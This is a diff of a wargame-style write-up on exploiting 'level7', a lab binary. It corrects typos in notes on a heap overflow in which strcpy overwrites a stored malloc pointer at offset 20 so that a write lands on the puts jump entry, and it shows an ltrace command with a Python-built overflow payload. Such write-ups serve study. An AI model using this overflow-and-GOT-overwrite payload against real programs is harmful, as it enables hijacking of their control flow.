@@ -9,10 +9,10 @@ the program segfault with no argument, and 1 argument, but it works with 2 argum
 
 the 2 arguments are stored into mallocs with strcpy
 
-some mallocs are saved in the precedent malloc
+some mallocs addresses are saved in the precedent malloc
 
 the address of the second malloc is saved at the end of the first malloc
-the address of the 4th malloc is savec at the end of the 3rd malloc
+the address of the 4th malloc is saved at the end of the 3rd malloc
 
 by changing these address we will exploit the program
 
@@ -54,7 +54,7 @@ strcpy(0x37373636, NULL <unfinished ...>
 
 0x37373636 is the offset 20
 
-so we write the address of puts jump at the offset 202
+so we write the address of puts jump at the offset 20
 
 $ ltrace ./level7 $(python -c 'print("A"*20+"\x08\x04\x99\x28"[::-1])')
 __libc_start_main(0x8048521, 2, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
